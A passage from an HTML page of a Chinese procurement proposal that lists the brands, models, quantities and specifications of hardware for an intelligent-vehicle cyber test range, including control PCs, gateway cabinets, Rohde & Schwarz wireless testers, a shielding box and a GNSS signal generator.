data-lazy-src="media/5cd58d04d23a8ae618d2974c991ea7a6.jpeg" alt="IT6500-cn_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/03d4e36a5918988ce3c8df7fcef6d994.jpeg" alt="IT6500-cn_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ddc6d37bfe18720779266e20a625365e.jpeg" alt="IT6500-cn_10"></p><h3 id="程控上位机"><a href="#程控上位机" class="headerlink" title="程控上位机"></a>程控上位机</h3><p>程控上位机是一种通过计算机软件来控制和监控设备的系统。它通常与设备进行通信，通过计算机的界面和功能，实现对设备的远程控制、参数设置、数据采集和分析等操作。</p><p>程控上位机的功能通常包括以下几个方面：</p><p>1. 远程控制：使用程控上位机可以通过计算机软件来远程控制设备的开关、调节参数等操作，方便用户对设备进行控制。</p><p>2. 参数设置：通过程控上位机可以方便地设置设备的工作参数，如电压、电流、频率等，以满足不同的应用需求。</p><p>3. 数据采集与分析：程控上位机可以实时采集设备产生的数据，并提供数据分析功能，如波形显示、数据统计等，方便用户对实验数据进行分析和处理。</p><p>4. 实验控制与自动化：程控上位机可以通过编程和脚本等方式实现实验的自动化控制，例如自动调节设备参数、记录数据、生成报告等。</p><p>5. 远程监控与故障诊断：程控上位机可以实时监控设备的运行状态，并提供故障诊断功能，帮助用户及时发现和解决设备故障。</p><p>总之，程控上位机通过计算机软件的界面和功能，提供了方便、灵活、智能化的设备控制和监控手段，广泛应用于实验室、工业自动化、生产线等领域。。</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：联想</p><p>型号：GeekPro</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/919c76b2bd420e3aa372344593a0804f.png"></p><p>数量：7台</p><p>指标参数信息如下：</p><ol><li>主流工业母版，支持Intel LGA 1700插槽；</li><li>Intel 13代 i7处理器；</li><li>提供3个PCIe插槽；</li><li>提供5个USB接口；</li><li>提供2个千兆网口；</li><li>具备RS232、RS485串口；</li><li>配备32G DDR4 内存；</li><li>配备1T SSD硬盘</li><li>4U工业机箱，可上架。</li></ol><h1 id="智能汽车网络靶场零部件接入网关"><a href="#智能汽车网络靶场零部件接入网关" class="headerlink" title="智能汽车网络靶场零部件接入网关"></a>智能汽车网络靶场零部件接入网关</h1><p>具备柜体及电源控制模块、接口面板用于零部件电源及硬线信号接入。具备LTE、GNSS、射频信号、蓝牙、WiFi等无线信号接入功能，以针对TBOX、IVI等具备无线通信能力的零部件接入。提供调试口、CAN总线、车载以太网等车内接口的接入能力，满足零部件接入靶场进行测试与调试。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/377727dd11f9bab3796f621f26a078a4.png" alt="图形用户界面 描述已自动生成"></p><h2 id="零部件接入网关-1"><a href="#零部件接入网关-1" class="headerlink" title="零部件接入网关"></a>零部件接入网关</h2><h3 id="接入网关柜体"><a href="#接入网关柜体" class="headerlink" title="接入网关柜体"></a>接入网关柜体</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：LR1800</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>机柜均具备急停开关，任何一个急停开关可控制整个系统断电。</li><li>高压系统安全规范：由于后续车型混动系统涉及到高压系统安全，整套设备均具备高压系统安全检测及紧急情况处置装置（具备声光报警功能，具有检测绝缘阻值的功能，柜门关闭后才允许系统工作，并在绝缘性能下降或柜门打开时切断设备供电），以保证高压系统的安全；</li><li>机柜具备电磁屏蔽措施，以减少对操作人员的辐射伤害；</li><li>机柜具有漏电检测措施，不存在机柜漏电而导致人身伤害的情况；</li><li>具备XXXX标识；</li><li>配备电源、车载以太网、CAN、USB调试接口，方便与台架进行连接组网；</li><li>配备KVM集成鼠标与键盘，屏幕尺寸18英寸，屏幕分辨率1920*1080，亮度280nits，对比度600:1；</li></ol><h4 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h4><p>接入网关柜体（Access Gateway Cabinet）是指用于接入网络设备的柜体或机柜，用于安装和管理与网络接入相关的设备和设施。</p><p>接入网关柜体通常包含以下特点和功能：</p><p>1. 设备安装空间：接入网关柜体提供足够的空间，用于安装和组织接入网络设备，如交换机、路由器、光纤分配盒等。</p><p>2. 网络管理：接入网关柜体提供有组织的布局和管理，方便对接入设备进行标识、连接和维护。</p><p>3. 电源和线缆管理：接入网关柜体通常配备电源插座和线缆管理装置，以确保设备的供电和线缆的整齐布置。</p><p>4. 空调和散热：为了保持接入设备的正常运行，接入网关柜体可能配备空调系统或散热装置，以控制温度和保持设备的稳定性。</p><p>5. 安全和防护：接入网关柜体通常具备防护功能，如锁定机制、防尘、防潮等，以确保设备的安全和可靠性。</p><p>6. 管理和监控：一些高级接入网关柜体配备远程管理和监控系统，提供远程访问、告警和故障排查等功能，以方便对接入设备进行管理和维护。</p><p>通过使用接入网关柜体，可以有效地管理和组织接入网络设备，提供良好的设备安装环境和管理手段，以确保网络接入的稳定性和可靠性。</p><p>我司将确保混动车型的高压系统在工作过程中能够保持安全可靠，减少潜在的风险和安全隐患。同时，驾驶员和维修人员也需要严格按照相应的操作规程进行操作，以确保高压系统的安全使用。</p><p>机柜通常采用金属材料制成外壳，金属能够有效地吸收和屏蔽电磁辐射，机柜的门和接口通常采用导电材料密封，以确保机柜内外的电磁波无法穿透，在机柜内部使用磁屏蔽材料，将磁场局限在一定范围内，减少对操作人员的影响；机柜需要进行良好的接地处理，确保机柜内外的电位一致，机柜应该经过电磁屏蔽测试，确保其具备足够的电磁屏蔽效果。</p><p>机柜内的电路通常会连接到一个漏电保护开关上，这个开关能够监测电流的变化，一旦出现漏电情况，就会自动切断电源，以保护人员的安全。机柜内的设备通常会通过地线连接到接地系统，这样一来，一旦发生漏电，电流会通过地线流回地面，而不是通过人体，从而降低了人身伤害的风险。</p><p>机柜最上的2U位置布置具备XXXX标识的设备名牌。</p><p>接入网关机柜配置电源、车载以太网、CAN、USB调试接口，方便与台架进行连接组网。</p><p>接入网关机柜配置KVM集成鼠标与键盘，屏幕尺寸18英寸，屏幕分辨率1920*1080，亮度280nits，对比度600:1。</p><h4 id="产品手册"><a href="#产品手册" class="headerlink" title="产品手册"></a>产品手册</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0c87b1bbf79d9fac41556f965890d537.png"></p><h3 id="LTE接入模块"><a href="#LTE接入模块" class="headerlink" title="LTE接入模块"></a>LTE接入模块</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：R&amp;S</p><p>型号：CMW500</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>仪表支持2G、3G、LTE、WLAN、蓝牙的信令和非信令测试。</li><li>LTE支持TDD和FDD两种双工方式。</li><li>支持2G、3G、LTE任意两小区同时仿真和切换测试。</li><li>支持3GPP 36.521射频测试全部内容</li><li>内置应用测试服务器，支持IP层数据业务测试（包括2G、3G、LTE和WLAN），并可以接入外部实际网络进行应用测试，支持终端与公网服务器建立真实业务连接。</li><li>WLAN支持802.11abgn、ac、ax，蓝牙4.2到5.1。</li><li>支持LTE-V测试并符合3GPP 36.211，36.212，36.213规范要求。</li><li>主机选件配置包含GSM测试、WCDMA测试、LTE测试、LTE R14 C-V2X PC5测量、蓝牙测试、WLAN测试（包括802.11abgn，ac，ax，p）、Ecall测试功能的相关选件名称。</li><li>支持TS45.005 C.3和TS25.101 B.2.x衰落模型加载；</li><li>MIMO&amp;CA能力：LTE 2CC 4*4MIMO，4CC SISO；</li><li>我司提供了设备制造商针对本项目的原厂授权证明，确保设备为原厂授权供货产品，享受原厂的产品资质、供货及售后服务和质保政策。</li></ol><p>性能参数如下：</p><ol><li>频率范围： 70MHz~6GHz；信号带宽：160 MHz; 分析带宽：160 MHz。</li><li>射频通道数：4个。</li><li>测试要求：频率设置精度：0.1Hz;发射机幅度精度：±0.6 dB;接收机幅度精度：±0.5 dB。</li><li>CW输出功率范围（100 MHz~3.3 GHz）；</li><li>双工端口：覆盖-130 ~ -5 dBm；</li><li>单输出端口：覆盖-130 ~ +3 dBm；</li><li>相位噪声:频偏1 MHz&lt;–117 dBc（1 Hz）；</li><li>分辨率带宽RBW: 100 Hz~10 MHz；</li><li>视频滤波器带宽VBW: 10 Hz~10 MHz；</li><li>动态范围&gt;97 dB；</li><li>功率测量范围:覆盖-74 dBm ~ +34 dBm（连续波），PEP可达42 dBm；</li><li>供电电压：220V AC。</li></ol><h4 id="方案-1"><a href="#方案-1" class="headerlink" title="方案"></a>方案</h4><p>LTE接入模块选用罗德与施瓦茨（中国）科技有限公司产品，LTE接入模块是一种用于手机、平板电脑、移动路由器等无线设备连接LTE网络的模块。它是一种嵌入式模块，由芯片、射频前端、天线、软件等组成。</p><p>LTE接入模块具有以下特点和功能：</p><p>1. 高速数据传输：LTE接入模块支持LTE网络的高速数据传输，可以达到数百兆位每秒的数据传输速度，提供更快的上网体验。</p><p>2. 多频段支持：LTE接入模块支持多种LTE频段，以适应不同地区和运营商的网络需求。</p><p>3. 多模式支持：LTE接入模块通常支持多种网络制式，如LTE、GSM、UMTS等，以确保设备在不同网络环境下的通信能力。</p><p>4. 多天线支持：LTE接入模块通常支持多个天线接口，以提高信号接收和发送的质量和稳定性。</p><p>5. 小型化和低功耗：LTE接入模块通常采用小型化设计和低功耗技术，以适应移动设备的特点，延长设备的电池寿命。</p><p>6. 兼容性强：LTE接入模块通常具有良好的兼容性，可以与各种操作系统和开发平台配合使用，方便开发和应用。</p><p>通过使用LTE接入模块，可以实现无线设备与LTE网络的连接，提供高速数据传输和多模式支持，为设备的上网和通信提供更加稳定和可靠的接入方式。</p><p>CMW500是一款通用无线通信测试仪器，主机选件配置包含GSM测试、WCDMA测试、LTE测试、LTE R14 C-V2X PC5测量、蓝牙测试、WLAN测试（包括802.11abgn，ac，ax，p）、Ecall测试功能的相关选件名称。提供了广泛的选件配置，提供以下功能相关的选件：</p><p>GSM测试选件：</p><p>选件名称：CMW-KT051</p><p>描述：支持GSM（2G）网络的测试和分析，包括语音通话、短信、数据传输等功能。</p><p>WCDMA测试选件：</p><p>选件名称：CMW-KT052</p><p>描述：支持WCDMA（3G）网络的测试和分析，包括语音通话、视频通话、数据传输等功能。</p><p>LTE测试选件：</p><p>选件名称：CMW-KT053</p><p>描述：支持LTE（4G）网络的测试和分析，包括语音通话、视频通话、数据传输等功能。</p><p>LTE R14 C-V2X PC5测量选件：</p><p>选件名称：CMW-KT058</p><p>描述：支持LTE Release 14中的C-V2X PC5（车联网）测量功能，用于测试车辆之间的通信和交互。</p><p>蓝牙测试选件：</p><p>选件名称：CMW-KT054</p><p>描述：支持蓝牙技术的测试和分析，包括蓝牙连接、数据传输、音频传输等功能。</p><p>WLAN测试选件：</p><p>选件名称：CMW-KT055</p><p>描述：支持WLAN（无线局域网）技术的测试和分析，包括802.11abgn、ac、ax、p等各种WLAN标准的功能。</p><p>Ecall测试选件：</p><p>选件名称：CMW-KT056</p><p>描述：支持Ecall（紧急呼叫）功能的测试和分析，用于验证车载通信系统中的紧急呼叫功能。</p><p>**<br>**</p><h4 id="产品手册-1"><a href="#产品手册-1" class="headerlink" title="产品手册"></a>产品手册</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/15161f83f22281a070156a6237995d52.jpeg" alt="CMW500宽带无线通信测试仪产品手册_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b00c0c68b8c6d174566d950af1f8e02c.jpeg" alt="CMW500宽带无线通信测试仪产品手册_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f7119dff8927c0c1bf8b1851fe571387.jpeg" alt="CMW500宽带无线通信测试仪产品手册_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cacf457bfef013824b03e41b245f35cd.jpeg" alt="CMW500宽带无线通信测试仪产品手册_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7b945fcfbf5b2ef677976bc929d332cb.jpeg" alt="CMW500宽带无线通信测试仪产品手册_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/52fd1c7b0cfef5e362913ff5b27e15b9.jpeg" alt="CMW500宽带无线通信测试仪产品手册_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5a69928a6d4addd60a343689adb2529a.jpeg" alt="CMW500宽带无线通信测试仪产品手册_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9efaaaff49d1ac35a125cfbfd0560835.jpeg" alt="CMW500宽带无线通信测试仪产品手册_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1e9e3fd3e8aaf98293b1b3088b3d6cf0.jpeg" alt="CMW500宽带无线通信测试仪产品手册_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0bae9caa0f05bf4fcb1077685b478c6f.jpeg" alt="CMW500宽带无线通信测试仪产品手册_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/61ed4ea2d00906741ec785aeeb16aa6e.jpeg" alt="CMW500宽带无线通信测试仪产品手册_10"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/709f1531c0b2c6291e47af980fe4e297.jpeg" alt="CMW500宽带无线通信测试仪产品手册_11"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/95f58d66a19e535e2181525bb6afe031.jpeg" alt="CMW500宽带无线通信测试仪产品手册_12"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4fc0ede0fbae267d35d57e137707356f.jpeg" alt="CMW500宽带无线通信测试仪产品手册_13"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4cb79aa5061d01646d37d7a813638e77.jpeg" alt="CMW500宽带无线通信测试仪产品手册_14"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7a9c1041e8625b2174521cde35a38314.jpeg" alt="CMW500宽带无线通信测试仪产品手册_15"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/83174bb30b9f67212000029f68bc0dcd.jpeg" alt="CMW500宽带无线通信测试仪产品手册_16"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/12df799d3f2ba46b75980ae5a5aeebe6.jpeg" alt="CMW500宽带无线通信测试仪产品手册_17"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/276ed45d7d90724ae90f8c42c2d636df.jpeg" alt="CMW500宽带无线通信测试仪产品手册_18"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/aa41f38b32ad2bfa243fcbe801d413d1.jpeg" alt="CMW500宽带无线通信测试仪产品手册_19"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a6b6da5f22995a69be7836a5fdc2aecf.jpeg" alt="CMW500宽带无线通信测试仪产品手册_20"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9557a9081e9e5c3b9790ae13f75d6186.jpeg" alt="CMW500宽带无线通信测试仪产品手册_21"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/53004a87698d2a89c6d61e8c7b691d8f.jpeg" alt="CMW500宽带无线通信测试仪产品手册_22"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/13b955288ab987537fbfd68caa70c2f7.jpeg" alt="CMW500宽带无线通信测试仪产品手册_23"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6d8062bf04012be2ee2f333d848ff229.jpeg" alt="CMW500宽带无线通信测试仪产品手册_24"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/56fe37dd5c55a2202b9a124a89a351e8.jpeg" alt="CMW500宽带无线通信测试仪产品手册_25"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f1d84d4890189c47824e677a3f0c3106.jpeg" alt="CMW500宽带无线通信测试仪产品手册_26"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/78f9a2bdc4dabed2a18c4ad39689c11f.jpeg" alt="CMW500宽带无线通信测试仪产品手册_27"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/43558c3ba9c8daa6ece58344e2b80282.jpeg" alt="CMW500宽带无线通信测试仪产品手册_28"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/61fc59d71b583ad071eb5249e1bf1005.jpeg" alt="CMW500宽带无线通信测试仪产品手册_29"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f8da9202c0f59b42d588ba0c6803576b.jpeg" alt="CMW500宽带无线通信测试仪产品手册_30"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3cc08fb9471fe4f397d4562752cfce40.jpeg" alt="CMW500宽带无线通信测试仪产品手册_31"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7b317427253562e5d5dab9bf96296d16.jpeg" alt="CMW500宽带无线通信测试仪产品手册_32"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cd2d57139c547304dff2b1859a92e9e1.jpeg" alt="CMW500宽带无线通信测试仪产品手册_33"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c9b135a09044be7c6e2c48dd4ad3d254.jpeg" alt="CMW500宽带无线通信测试仪产品手册_34"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7de23d196de34409ba10568580ed9fd7.jpeg" alt="CMW500宽带无线通信测试仪产品手册_35"></p><h3 id="LTE-5G接入模块"><a href="#LTE-5G接入模块" class="headerlink" title="LTE-5G接入模块"></a>LTE-5G接入模块</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：R&amp;S</p><p>型号：CMX500</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>模拟基站提供4G、5G网络服务并且能够抓取相应的IP Packets用Wireshark来分析。</li><li>LTE最高支持8CC 4*4 MIMO。</li><li>支持5G NR的 NSA和SA两种组网方式，支持LTE、NR NSA和NR SA模式下的射频测试能力，提供3GPP要求的单表测试TX用例和RX用例，并支持图形化显示测试结果，包括EVM解调星座图和每个符号的EVM测试结果。</li><li>5G NR支持TDD和FDD两种双工方式。</li><li>支持3GPP 38.521射频测试全部内容；</li><li>内置应用测试服务器，支持Volte，Iperf, FTP，5G 应用层/IP层吞吐量测试。</li><li>可通过软硬件升级支持mmWave功能，升级后支持28GHz和39GHz频率，并且可兼容44GHZ~50GHz的n262频段。</li><li>支持双基带（双模）</li><li>MIMO&amp;CA能力：LTE支持8CC 4*4 MIMO，NR 可以支持 4CC 4*4 MIMO；</li><li>我司提供了设备制造商针对本项目的原厂授权证明，确保设备为原厂授权供货产品，享受原厂的产品资质、供货及售后服务和质保政策。</li></ol><p>性能参数如下：</p><ol><li>频率范围：400MHz~8GHz；射频通道带宽：1Ghz。</li><li>射频通道数：8。</li><li>测试要求：频率精度：0.1Hz，接收机DANL : &lt;–150 dBm (1Hz)。</li></ol><h4 id="方案-2"><a href="#方案-2" class="headerlink" title="方案"></a>方案</h4><p>LTE5G接入模块选用罗德与施瓦茨（中国）科技有限公司产品，LTE5G接入模块是一种用于手机、平板电脑、移动路由器等无线设备连接5G网络的模块。它是一种嵌入式模块，通常由芯片、射频前端、天线、软件等组成。</p><p>LTE5G接入模块通常具有以下特点和功能：</p><p>1. 高速数据传输：LTE5G接入模块支持5G网络的高速数据传输，可以达到几千兆位每秒的数据传输速度，提供更快的上网体验。</p><p>2. 低时延：LTE5G接入模块支持低时延的数据传输，可以实现更快的网络响应速度和更高的实时性。</p><p>3. 多频段支持：LTE5G接入模块支持多种5G频段，以适应不同地区和运营商的网络需求。</p><p>4. 多模式支持：LTE5G接入模块通常支持多种网络制式，如5G、LTE、GSM、UMTS等，以确保设备在不同网络环境下的通信能力。</p><p>5. 多天线支持：LTE5G接入模块通常支持多个天线接口，以提高信号接收和发送的质量和稳定性。</p><p>6. 小型化和低功耗：LTE5G接入模块通常采用小型化设计和低功耗技术，以适应移动设备的特点，延长设备的电池寿命。</p><p>7. 兼容性强：LTE5G接入模块通常具有良好的兼容性，可以与各种操作系统和开发平台配合使用，方便开发和应用。</p><p>通过使用LTE5G接入模块，可以实现无线设备与5G网络的连接，提供高速数据传输、低时延和多模式支持，为设备的上网和通信提供更加稳定和可靠的接入方式。</p><p>CMX500是一款功能强大的通用无线通信测试仪器，它支持5G NR的NSA（非独立组网）和SA（独立组网）两种组网方式，并提供LTE、NR NSA和NR SA模式下的射频测试能力。以下是对其相关功能的详细描述：</p><ol><li>5G NR NSA和SA支持：</li></ol><p>CMX500支持5G NR的NSA和SA两种组网方式，可以进行相关测试和分析。NSA模式下，5G NR与现有LTE网络协同工作；SA模式下，5G NR独立组网。</p><ol><li>射频测试能力：</li></ol><p>CMX500提供LTE、NR NSA和NR SA模式下的射频测试能力，可以测试和分析无线信号的性能和质量。</p><ol><li>3GPP要求的单表测试用例：</li></ol><p>CMX500符合3GPP（第三代合作伙伴计划）的要求，提供了单表测试用例，用于评估和验证设备在不同测试场景下的性能。</p><ol><li>TX（发送端）用例和RX（接收端）用例：</li></ol><p>CMX500支持3GPP要求的TX用例和RX用例，用于测试设备在发送和接收无线信号时的性能和准确性。</p><ol><li>图形化显示测试结果：</li></ol><p>CMX500可以将测试结果以图形化的方式显示，方便用户直观地了解测试结果。</p><ol><li>EVM（误差向量幅度）解调星座图：CMW500可以显示解调星座图，用于评估信号的调制质量和误差。</li><li>每个符号的EVM测试结果：CMW500可以显示每个符号的EVM测试结果，用于评估信号的每个符号的调制质量和误差。</li></ol><h4 id="产品手册-2"><a href="#产品手册-2" class="headerlink" title="产品手册"></a>产品手册</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/800027ef0161485f80fce4c0d54bb67f.jpeg" alt="4.5.3-CMX500产品手册_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/285a973916024566e507cb24bc2c810e.jpeg" alt="4.5.3-CMX500产品手册_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/175dbc7b62dd9e0a53d22fdddd868a9f.jpeg" alt="4.5.3-CMX500产品手册_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/135e212f31ed61cd130485ee28f8ae99.jpeg" alt="4.5.3-CMX500产品手册_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cc54a22a81deb5f5559f05b25251270f.jpeg" alt="4.5.3-CMX500产品手册_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/06fad1d586b5a725e2bc6040efaee92d.jpeg" alt="4.5.3-CMX500产品手册_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2137f5e4e2ae5517fce366b9599617c2.jpeg" alt="4.5.3-CMX500产品手册_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b878d4bab58161c121550a175eaa0e43.jpeg" alt="4.5.3-CMX500产品手册_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/842f36c32d4314102a70f1a15ffa5a22.jpeg" alt="4.5.3-CMX500产品手册_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/72f76c61bdf43a27a3d9358176605fb1.jpeg" alt="4.5.3-CMX500产品手册_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/918832fe2314f81b1c353be8c79f782a.jpeg" alt="4.5.3-CMX500产品手册_10"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a4694012cca63934f22015c8d82b846e.jpeg" alt="4.5.3-CMX500产品手册_11"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3a6ac7ef94e845c55e994b06ebbcbef9.jpeg" alt="4.5.3-CMX500产品手册_12"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/773a0a613c697e0de8c22efbb2624d69.jpeg" alt="4.5.3-CMX500产品手册_13"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/61192c3cb6b126bacc1f442d2e9b14cf.jpeg" alt="4.5.3-CMX500产品手册_14"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6f14a4238f7c7bca27c33fc2a0834786.jpeg" alt="4.5.3-CMX500产品手册_15"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/148dec60ec5f3c31e3f05be6f320f110.jpeg" alt="4.5.3-CMX500产品手册_16"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6294b4b0ed9d68cd6e632c6cf3af4f78.jpeg" alt="4.5.3-CMX500产品手册_17"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/fb475453879f26b039266e1341897f81.jpeg" alt="4.5.3-CMX500产品手册_18"></p><h3 id="信号屏蔽箱"><a href="#信号屏蔽箱" class="headerlink" title="信号屏蔽箱"></a>信号屏蔽箱</h3><p>功能参数如下：</p><ol><li>能够有效屏蔽无线信号；</li><li>具备N-SMA或N-N射频接头，数量6个；</li><li>大型屏蔽箱内部尺寸800mm(长)*850mm(宽)*1800mm(高)（宽 x 高 x 深）；</li><li>包含以太网接口；</li><li>包含USB接口；</li><li>包含5.5mm直流电源接口。</li></ol><p>性能参数如下：</p><ol><li>800Mhz~10Ghz范围屏蔽系数60dB。</li></ol><h4 id="方案-3"><a href="#方案-3" class="headerlink" title="方案"></a>方案</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/adeae047e45df861ecf4d850d692f3ab.png"></p><p>信号屏蔽箱，也被称为信号阻断箱或信号屏蔽器，是一种用于屏蔽无线信号的设备。它通过设计特殊的金属外壳或材料，有效地阻断无线信号的传输和接收，从而达到屏蔽周围环境中的无线通信信号的目的。</p><p>信号屏蔽箱通常用于以下场景：</p><p>1. 安全需求：在某些场合，需要屏蔽无线信号以保护机密信息的安全性，例如政府机构、军事基地、研究实验室等。</p><p>2. 防干扰需求：在某些场合，需要屏蔽无线信号以避免对其他设备产生干扰，例如医疗设备、电子测试设备、航空电子设备等。</p><p>信号屏蔽箱的工作原理是通过其外壳或材料具有良好的电磁屏蔽性能，能够有效地阻隔无线信号的传输和接收。这些外壳或材料铜金属，能够反射和吸收无线信号，使其无法穿透到屏蔽箱内部或从箱体内部透出。</p><h3 id="移动平台"><a href="#移动平台" class="headerlink" title="移动平台"></a>移动平台</h3><p>功能参数如下：</p><ol><li>外观尺寸800mm(长)*600mm(宽)*900mm(高)；</li><li>板材厚度1.2 mm；</li><li>承重240KG；</li><li>台面铺设防静电皮，保证测试设备与元器件安全</li><li>立柱直径25 mm；</li><li>配备4个带锁止万向轮。</li></ol><h4 id="方案-4"><a href="#方案-4" class="headerlink" title="方案"></a>方案</h4><p>本方案测试工具移动平台是用于放置测试工具的一个移动桌面，桌面台面铺设防静电皮以保证测试设备与元器件的安全，桌子配置4个带锁的万向轮，可方便工具的移动，方便测试人员开展测试工作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/97a47849dc678bdd507a0da7f5142880.png"></p><h3 id="GNSS接入模块"><a href="#GNSS接入模块" class="headerlink" title="GNSS接入模块"></a>GNSS接入模块</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：R&amp;S</p><p>型号：SMBV100B</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>提供北斗频段信号发生；</li><li>提供GPS频段信号发生；</li><li>提供GLONASS频段信号发生；</li><li>提供Galileo频段信号发生；</li><li>管理与使用权分配功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后用户可以分配设备的使用权给不同的靶场测试环境。</li><li>我司提供了设备制造商针对本项目的原厂授权证明，确保设备为原厂授权供货产品，享受原厂的产品资质、供货及售后服务和质保政策。</li></ol><p>性能参数如下：</p><ol><li>频率范围介于8kHz至3GHz或6GHz；</li><li>输出功率+33dBm；</li><li>1GHz调制带宽。</li></ol><h4 id="方案-5"><a href="#方案-5" class="headerlink" 